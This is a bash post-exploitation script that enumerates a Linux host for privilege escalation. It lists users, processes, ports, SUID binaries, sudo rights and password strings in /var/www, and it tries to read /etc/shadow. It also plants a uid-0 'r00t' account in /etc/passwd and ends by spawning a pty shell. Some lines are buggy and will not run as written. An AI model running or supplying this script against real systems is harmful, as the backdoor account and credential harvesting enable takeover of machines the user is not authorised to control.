#!/bin/bash
# Gather Basic Linux OS Info for Priv Esc

# Set Report Output Here
report=/tmp/report.txt


echo ____/\\\\\\\\\\\\_______________________________/\\\__________________________________________________________/\\\_________        >> $report
echo ___/\\\//////////_______________________________\/\\\_________________________________________________________\/\\\_________       >> $report
echo  __/\\\________________________________/\\\______\/\\\_________________________________________________________\/\\\_________      >> $report
echo   _\/\\\____/\\\\\\\__/\\\\\\\\\_____/\\\\\\\\\\\_\/\\\_____________/\\\\\\\\___/\\/\\\\\\\_________/\\\\\\\\\\_\/\\\_________     >> $report
echo    _\/\\\___\/////\\\_\////////\\\___\////\\\////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\/////\\\_______\/\\\//////__\/\\\\\\\\\\__    >> $report
echo     _\/\\\_______\/\\\___/\\\\\\\\\\_____\/\\\______\/\\\/////\\\__/\\\\\\\\\\\__\/\\\___\///________\/\\\\\\\\\\_\/\\\/////\\\_   >> $report
echo      _\/\\\_______\/\\\__/\\\/////\\\_____\/\\\_/\\__\/\\\___\/\\\_\//\\///////___\/\\\_______________\////////\\\_\/\\\___\/\\\_ >> $report 
echo       _\//\\\\\\\\\\\\/__\//\\\\\\\\/\\____\//\\\\\___\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\__________/\\\__/\\\\\\\\\\_\/\\\___\/\\\_ >> $report
echo        __\////////////_____\////////\//______\/////____\///____\///____\//////////__\///__________\///__\//////////__\///____\///__ >> $report

echo
echo
echo --------------------------- >> $report
echo Who Are We: >> $report
echo --------------------------- >> $report
id >> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Can We Get To Root? >> $report
echo --------------------------- >> $report
cd /root && echo YES || echo No  >> $report

echo >> $report 
echo >> $report
echo --------------------------- >> $report
echo Can We Edit /etc/passwd? >> $report
echo --------------------------- >> $report
echo r00t:x:0:0:r00t:/root:/bin/bash >> /etc/passwd || echo No>> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo What OS? What Version? What arch? >> $report
echo --------------------------- >> $report
cat /etc/*-release >> $report
uname -a >> $report
lsb_release -a >> $report


echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Who Are The Users? >> $report
echo --------------------------- >> $report
cat /etc/passwd >> $report

echo  >> $report
echo  >> $report
echo --------------------------- >> $report
echo Who Actually Has Logins? >> $report
echo --------------------------- >> $report
grep -vE "nologin|false" /etc/passwd >> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Can We Get To Shadow? >> $report
echo --------------------------- >> $report
cat /etc/shadow || echo No >> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo What Are The WWW Contents? >> $report
echo --------------------------- >> $report
ls -la /var/www >> $report
echo *** Remember to check for passwords >> $report


echo >> $report
echo >> $report
echo --------------------------- >> $report
echo WWW Files with Passwords? >> $report
echo --------------------------- >> $report
grep -rl "password" /var/www/*.php >> $report


echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Whats Currently Running On The Box? >> $report
echo --------------------------- >> $report
ps aux >> $report

echo  >> $report
echo  >> $report
echo --------------------------- >> $report
echo What Ports Are Listening? FYI no UDP or IPv6 shown . . . .  >> $report
echo --------------------------- >> $report
netstat -antup | grep -vE :: | grep -vE udp >> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Any interesting WWW Files? >> $report
echo --------------------------- >> $report
find /var/www/html -iname '*config*' || No Files Found >> $report


echo >> $report
echo >> $report
echo --------------------------- >> $report
echo What Services Are Running As Root? >> $report
echo --------------------------- >> $report
ps aux | grep root >> $report
echo ------------ >> $report
ps -ef | grep root >> $report


echo >> $report
echo >> $report
echo --------------------------- >> $report
echo Find Weak Perms On Executables >> $report
echo --------------------------- >> $report
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null >> $report
echo ////////////////////////// >> $report
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null >> $report

echo >> $report
echo >> $report
echo --------------------------- >> $report
echo What Programs Can My User Run >> $report
echo --------------------------- >> $report
sudo -l >> $report

echo >> $report
echo >> $report
echo END  >> $report
echo Report Can Be Found at $report


# Echo Attempt To Import Shell
python -c 'import pty;pty.spawn("/bin/bash")'
